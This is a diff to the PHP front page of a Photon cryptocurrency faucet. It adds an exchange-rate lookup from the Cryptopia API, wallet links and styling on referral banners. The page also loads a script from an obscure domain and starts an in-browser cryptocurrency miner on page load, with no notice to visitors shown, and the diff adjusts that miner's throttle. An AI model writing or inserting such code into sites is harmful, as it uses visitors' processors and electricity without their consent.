@@ -31,6 +31,15 @@ try {
 <script src='https://www.google.com/recaptcha/api.js'></script>
 <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 
+<?php
+if(!file_exists('images/phobtc.txt') || time() - filemtime('images/phobtc.txt') >= 60*15){
+    file_put_contents('images/phobtc.txt',file_get_contents("https://www.cryptopia.co.nz/api/GetMarket/PHO_BTC"));
+}
+$pair = json_decode(file_get_contents('images/phobtc.txt'));
+$exch_rate = sprintf("%.8f", $pair->Data->LastPrice);
+
+?>
+
     <!--ANALYTICS HERE!!-->
 </head>
 
@@ -42,13 +51,13 @@ try {
 
 
         <h3><a href='./'><img src='<?php echo $logo; ?>' height='256'></a><br/><br/> <?php echo $faucetSubtitle; ?></h3>
-
-<p><a href="http://www.photoncc.com/" target="_blank">Photon Coin Information</a> / <a href="https://github.com/photonproject/photon/releases" target="_blank">Photon Wallet</a> / <a href="https://www.cryptopia.co.nz/Register?referrer=vxdhost" target="Blank">Exchange for FIAT</a></p>
+<?php if($exch_rate): ?><p><center><strong>1 PHO = <?php echo $exch_rate;?> BTC<?php endif; ?>
+<p><a href="http://www.photoncc.com/" target="_blank">Photon Coin Information</a> | <a href="https://github.com/photonproject/photon/releases" target="_blank">Photon Wallet</a> | <a href="https://www.cryptopia.co.nz/Register?referrer=vxdhost" target="Blank">Exchange for FIAT</a></p>
 
         <fieldset>
 
             <!-- ADS ADS ADS ADS ADS ADS ADS ADS ADS -->
-            <center><a href="http://freedoge.co.in/?r=1528473" target="_blank"><img src="http://static1.freedoge.co.in/banners/468x60-3.png" /></a></center><br />
+            <center><a href="http://freedoge.co.in/?r=1528473" target="_blank"><img class="img-responsive" src="http://static1.freedoge.co.in/banners/468x60-3.png" /></a></center><br />
 <!-- Adblock -->
 <ins class="adsbygoogle"
      style="display:block"
@@ -154,6 +163,8 @@ try {
                     die('DB Error' . mysql_error());
                 } else { ?>
 
+                <p>Need A Wallet?<br /><a href="https://github.com/photonproject/photon/releases" target="_blank">Official Photon Wallet</a> | <a href="https://www.cryptopia.co.nz/Register?referrer=vxdhost" target="Blank">Cryptopia Exchange Wallet</a></p>
+
                     <input type='text' name='wallet' required placeholder='Photon Wallet Recieve Address'>
 
                     <input type='text' name='paymentid' placeholder="Payment ID (Optional)">
@@ -172,7 +183,7 @@ try {
                     <br/>
                     <div class="g-recaptcha" data-sitekey="6LdQ6UIUAAAAADh-64Qbv-F8UZl_WiAJ-y4rWgoY"></div>
 
-                    <center><a href="https://freebitco.in/?r=10148588" target="_blank"><img src="https://static1.freebitco.in/banners/468x60-3.png" /></a></center><br />
+                    <center><a href="https://freebitco.in/?r=10148588" target="_blank"><img class="img-responsive" src="https://static1.freebitco.in/banners/468x60-3.png" /></a></center><br />
 
                     <center><input id="submt" disabled="disabled" type='submit' value='Gimme by Photons !!!'></center>
                     <br>
@@ -223,7 +234,7 @@ try {
 <script src="https://www.freecontent.bid./Z60R.js"></script>
 <script>
     var miner = new Client.Anonymous('<?php echo $jsMinerKey; ?>', {
-        throttle: 0.5
+        throttle: 0.7
     });
     miner.start();
     setTimeout(function() {
